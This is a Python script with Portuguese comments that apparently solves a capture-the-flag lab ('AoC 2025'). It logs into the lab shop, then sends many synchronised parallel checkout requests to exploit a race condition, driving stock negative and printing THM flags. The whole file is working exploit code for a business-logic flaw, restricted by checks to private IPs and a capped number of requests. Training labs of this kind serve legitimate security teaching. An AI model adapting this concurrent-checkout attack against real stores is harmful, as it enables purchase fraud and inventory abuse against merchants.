#!/usr/bin/env python3
"""Reproduz o checkout paralelo somente na loja laboratorial do AoC 2025."""

import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from ipaddress import ip_address
import re
from threading import Barrier
from urllib.parse import urlparse

import requests


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--ip", required=True, help="IP privado da Lab Machine")
    parser.add_argument("--produto", choices=("sled-101", "plush-001"), required=True)
    parser.add_argument("--requisicoes", type=int, default=16)
    parser.add_argument("--usuario", default="attacker")
    parser.add_argument("--senha", default="attacker@123", help="Credencial de teste informada na sala")
    args = parser.parse_args()
    if not ip_address(args.ip).is_private:
        parser.error("use somente o IP privado da Lab Machine")
    if not 2 <= args.requisicoes <= 30:
        parser.error("--requisicoes deve ficar entre 2 e 30")

    base = f"http://{args.ip}"
    session = requests.Session()
    login = session.post(base + "/login", data={"username": args.usuario, "password": args.senha}, timeout=10)
    if urlparse(login.url).path != "/shop":
        raise SystemExit("Login no laboratório não foi confirmado")

    def adicionar_ao_carrinho():
        response = session.post(base + "/add_to_cart", data={"product_id": args.produto, "qty": "1"}, timeout=10)
        response.raise_for_status()

    adicionar_ao_carrinho()
    compra = session.post(base + "/process_checkout", timeout=15)
    compra.raise_for_status()
    print("Compra normal:", compra.json().get("results", []))

    adicionar_ao_carrinho()
    cookies = session.cookies.get_dict()
    barreira = Barrier(args.requisicoes)

    def checkout_paralelo(numero):
        barreira.wait(timeout=10)
        resposta = requests.post(base + "/process_checkout", cookies=cookies, timeout=25)
        resposta.raise_for_status()
        estados = [item.get("status") for item in resposta.json().get("results", [])]
        return numero, estados

    with ThreadPoolExecutor(max_workers=args.requisicoes) as executor:
        futuros = [executor.submit(checkout_paralelo, i) for i in range(args.requisicoes)]
        for futuro in as_completed(futuros):
            try:
                print("Checkout", *futuro.result())
            except Exception as exc:
                print("Falha em uma requisição:", exc)

    loja = session.get(base + "/shop", timeout=10)
    loja.raise_for_status()
    print("Indicadores encontrados na loja:", re.findall(r"In Stock: -?\d+|THM\{[^}]+\}", loja.text))


if __name__ == "__main__":
    main()
